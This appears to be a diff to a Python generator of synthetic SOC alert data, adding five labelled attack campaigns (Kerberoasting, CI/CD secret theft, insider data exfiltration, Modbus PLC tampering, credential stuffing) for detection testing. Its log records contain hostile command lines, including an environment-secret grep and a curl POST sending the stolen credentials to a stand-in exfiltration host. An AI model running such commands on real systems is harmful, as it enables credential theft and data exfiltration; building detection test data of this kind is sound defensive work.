@@ -127,6 +127,95 @@ def build_attack_campaigns(base_time: datetime) -> List[Dict[str, Any]]:
             "is_anomalous": True, "anomaly_reasons": ["Unseen executable binary hash", "Parent-child hierarchy deviation in Temp folder"]
         })
 
+    # Campaign 6: Active Directory Kerberoasting & SPN Hash Harvesting
+    kerberoast_stages = [
+        ("Authentication Systems", "Kerberoasting: Service Ticket Request", "HIGH", "CORP-DC-02", "10.0.1.11", "10.0.5.95", "j_martinez", "lsass.exe", "Kerberos TGS-REQ requested with RC4-HMAC encryption for SPN MSSQLSvc/CORP-DB", "", "", "T1558.003", "Kerberoasting", "Credential Access"),
+        ("EDR", "PowerShell Execution", "HIGH", "DEV-WORKSTATION-04", "10.0.5.95", "10.0.5.95", "j_martinez", "powershell.exe -ep bypass Invoke-Kerberoast", "PowerShell command execution invoking automated SPN hash harvesting script", "", "9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b", "T1059.001", "PowerShell", "Execution"),
+        ("Windows Event Logs", "Logon Script / Pass-the-Ticket Logon", "CRITICAL", "CORP-DC-02", "10.0.1.11", "10.0.5.95", "Administrator", "lsass.exe", "Event 4624 Type 9: Domain admin session established via forged Kerberos ticket", "", "", "T1550.002", "Pass the Ticket", "Lateral Movement")
+    ]
+    for s_idx, s in enumerate(kerberoast_stages):
+        t = (base_time + timedelta(minutes=30 + s_idx * 16)).isoformat() + "Z"
+        campaign_records.append({
+            "id": f"alt-kerb-bigdata-{s_idx:03d}-{uuid.uuid4().hex[:6]}",
+            "timestamp": t, "source": s[0], "alert_type": s[1], "severity": s[2],
+            "host": s[3], "destination_ip": s[4], "source_ip": s[5], "source_user": s[6],
+            "process": s[7], "detection_rule": f"AD Threat Rule: {s[1]}", "raw_message": s[8],
+            "domain": s[9], "file_hash": s[10], "mitre_technique_id": s[11],
+            "mitre_technique_name": s[12], "mitre_tactic": s[13], "confidence": 0.94,
+            "is_anomalous": True, "anomaly_reasons": ["Unusual RC4 Kerberos ticket request", "Domain Administrator logon from non-admin subnet"]
+        })
+
+    # Campaign 7: Supply Chain CI/CD Runner Poisoning & Secret Harvesting
+    cicd_stages = [
+        ("Linux Logs", "Container Base Image Tampering", "HIGH", "DEV-SRV-TEST", "10.0.4.101", "45.33.32.156", "gitlab_runner", "dockerd -> container-entrypoint.sh", "GitLab runner pulling unsigned container image from untrusted registry", "registry-internal-mirror.xyz", "5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d", "T1195.002", "Supply Chain Compromise", "Initial Access"),
+        ("EDR", "Credentials in Files / Environment Variable Theft", "CRITICAL", "DEV-SRV-TEST", "10.0.4.101", "45.33.32.156", "gitlab_runner", "env | grep -E 'AWS|TOKEN|SECRET' > /tmp/creds.txt", "Automated secret scraping script capturing production deployment tokens", "", "1f2e3d4c5b6a7f8e9d0c1b2a3f4e5d6c7b8a9f0e1d2c3b4a5f6e7d8c9b0a1f2e", "T1552.001", "Credentials in Files", "Credential Access"),
+        ("Network Monitoring", "Data Exfiltration to Webhook", "HIGH", "DEV-SRV-TEST", "10.0.4.101", "45.33.32.156", "gitlab_runner", "curl -X POST -d @/tmp/creds.txt https://webhook-drop-exfil.biz/receiver", "Outbound HTTPS telemetry containing high-entropy AWS secret keys transmitted", "webhook-drop-exfil.biz", "", "T1048.003", "Exfiltration Over Unencrypted/Alternative Protocol", "Exfiltration")
+    ]
+    for s_idx, s in enumerate(cicd_stages):
+        t = (base_time + timedelta(minutes=50 + s_idx * 12)).isoformat() + "Z"
+        campaign_records.append({
+            "id": f"alt-cicd-bigdata-{s_idx:03d}-{uuid.uuid4().hex[:6]}",
+            "timestamp": t, "source": s[0], "alert_type": s[1], "severity": s[2],
+            "host": s[3], "destination_ip": s[4], "source_ip": s[5], "source_user": s[6],
+            "process": s[7], "detection_rule": f"CI/CD Pipeline Security Rule: {s[1]}", "raw_message": s[8],
+            "domain": s[9], "file_hash": s[10], "mitre_technique_id": s[11],
+            "mitre_technique_name": s[12], "mitre_tactic": s[13], "confidence": 0.93,
+            "is_anomalous": True, "anomaly_reasons": ["Non-standard outbound egress from build cluster", "Environment secrets accessed in build step"]
+        })
+
+    # Campaign 8: Low-and-Slow Insider HR Data Staging & Exfiltration
+    insider_stages = [
+        ("Application Logs", "Mass HR Employee Database Export", "HIGH", "HR-TERMINAL-01", "10.0.5.115", "10.0.5.115", "hr_director_s_cole", "workday_client.exe", "Off-hours bulk CSV export of all executive salaries and SSNs (48,000 records)", "", "", "T1005", "Data from Local System", "Collection"),
+        ("EDR", "Archive via Utility with Password Protection", "HIGH", "HR-TERMINAL-01", "10.0.5.115", "10.0.5.115", "hr_director_s_cole", "7z.exe a -pEncryptedLedger2026! C:\\Temp\\hr_vault.7z C:\\Users\\hr\\Exports\\*", "Password-protected 7z archive created to evade standard DLP content filters", "", "4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b", "T1560.001", "Archive via Utility", "Collection"),
+        ("Network Monitoring", "Exfiltration to Cloud Storage", "HIGH", "HR-TERMINAL-01", "10.0.5.115", "10.0.5.115", "hr_director_s_cole", "chrome.exe", "Multi-megabyte POST upload to personal unapproved storage sync-vault-personal.io", "sync-vault-personal.io", "", "T1567.002", "Exfiltration to Cloud Storage", "Exfiltration")
+    ]
+    for s_idx, s in enumerate(insider_stages):
+        t = (base_time + timedelta(minutes=70 + s_idx * 15)).isoformat() + "Z"
+        campaign_records.append({
+            "id": f"alt-insider-bigdata-{s_idx:03d}-{uuid.uuid4().hex[:6]}",
+            "timestamp": t, "source": s[0], "alert_type": s[1], "severity": s[2],
+            "host": s[3], "destination_ip": s[4], "source_ip": s[5], "source_user": s[6],
+            "process": s[7], "detection_rule": f"Insider Governance Rule: {s[1]}", "raw_message": s[8],
+            "domain": s[9], "file_hash": s[10], "mitre_technique_id": s[11],
+            "mitre_technique_name": s[12], "mitre_tactic": s[13], "confidence": 0.91,
+            "is_anomalous": True, "anomaly_reasons": ["Unusual off-hours bulk database export", "Encrypted archive upload to personal storage"]
+        })
+
+    # Campaign 9: Critical Infrastructure SCADA / IoT Modbus PLC Tampering
+    scada_stages = [
+        ("Network Monitoring", "ICS Modbus Unauthorized Function Code", "CRITICAL", "DC-HVAC-PLC-01", "10.0.8.12", "192.168.99.44", "ot_gateway_service", "modbus_poll.elf", "Modbus TCP Function Code 16 (Write Multiple Holding Registers) from unauthorized IP", "", "", "T0855", "Unauthorized Command Message", "Execution"),
+        ("Linux Logs", "Datacenter Chiller Setpoint Tampering", "CRITICAL", "DC-HVAC-PLC-01", "10.0.8.12", "192.168.99.44", "ot_gateway_service", "chiller_controller", "Emergency cooling loop override requested raising chiller temperature threshold to +45°C", "", "", "T0831", "Manipulation of Control", "Impact")
+    ]
+    for s_idx, s in enumerate(scada_stages):
+        t = (base_time + timedelta(minutes=85 + s_idx * 18)).isoformat() + "Z"
+        campaign_records.append({
+            "id": f"alt-scada-bigdata-{s_idx:03d}-{uuid.uuid4().hex[:6]}",
+            "timestamp": t, "source": s[0], "alert_type": s[1], "severity": s[2],
+            "host": s[3], "destination_ip": s[4], "source_ip": s[5], "source_user": s[6],
+            "process": s[7], "detection_rule": f"Industrial OT Sensor Rule: {s[1]}", "raw_message": s[8],
+            "domain": s[9], "file_hash": s[10], "mitre_technique_id": s[11],
+            "mitre_technique_name": s[12], "mitre_tactic": s[13], "confidence": 0.97,
+            "is_anomalous": True, "anomaly_reasons": ["Modbus register write from unapproved subnet", "Critical datacenter thermal setpoint modification"]
+        })
+
+    # Campaign 10: Perimeter Gateway Credential Stuffing & Account Takeover
+    stuffing_stages = [
+        ("Firewall", "Perimeter Credential Stuffing Burst", "HIGH", "PAYMENT-GW-01", "10.0.3.15", "103.251.167.22", "anonymous_botnet", "haproxy", "Volumetric login surge: 840 failed POST /api/auth/login attempts within 60 seconds", "", "", "T1110.004", "Credential Stuffing", "Credential Access"),
+        ("Application Logs", "Multi-Account Password Spray Validation", "HIGH", "PAYMENT-GW-01", "10.0.3.15", "103.251.167.22", "sec_guard", "node_auth_cluster", "Brute-force hit against enterprise customer accounts with rotated user-agents", "", "", "T1110.003", "Password Spraying", "Credential Access"),
+        ("Authentication Systems", "Account Takeover & MFA Reset Bypass", "CRITICAL", "PAYMENT-GW-01", "10.0.3.15", "103.251.167.22", "vip_customer_walsh", "node_auth_cluster", "Successful password validation immediately followed by unauthorized MFA recovery token generation", "", "", "T1078", "Valid Accounts", "Persistence")
+    ]
+    for s_idx, s in enumerate(stuffing_stages):
+        t = (base_time + timedelta(minutes=100 + s_idx * 10)).isoformat() + "Z"
+        campaign_records.append({
+            "id": f"alt-stuff-bigdata-{s_idx:03d}-{uuid.uuid4().hex[:6]}",
+            "timestamp": t, "source": s[0], "alert_type": s[1], "severity": s[2],
+            "host": s[3], "destination_ip": s[4], "source_ip": s[5], "source_user": s[6],
+            "process": s[7], "detection_rule": f"Edge Gateway Security Rule: {s[1]}", "raw_message": s[8],
+            "domain": s[9], "file_hash": s[10], "mitre_technique_id": s[11],
+            "mitre_technique_name": s[12], "mitre_tactic": s[13], "confidence": 0.95,
+            "is_anomalous": True, "anomaly_reasons": ["Automated credential stuffing fingerprint", "Immediate MFA factor reset post-logon"]
+        })
+
     return campaign_records
 
 
@@ -142,7 +231,7 @@ def generate_high_volume_dataset(total_records: int, output_json: str, output_cs
     # Pre-generate ground-truth attacks
     attack_records = build_attack_campaigns(base_time)
     num_attacks = len(attack_records)
-    print(f"[*] Prepared {num_attacks} high-fidelity attack alerts across 5 simultaneous campaigns.")
+    print(f"[*] Prepared {num_attacks} high-fidelity attack alerts across 10 simultaneous campaigns.")
 
     # High-volume background noise templates
     noise_templates = [
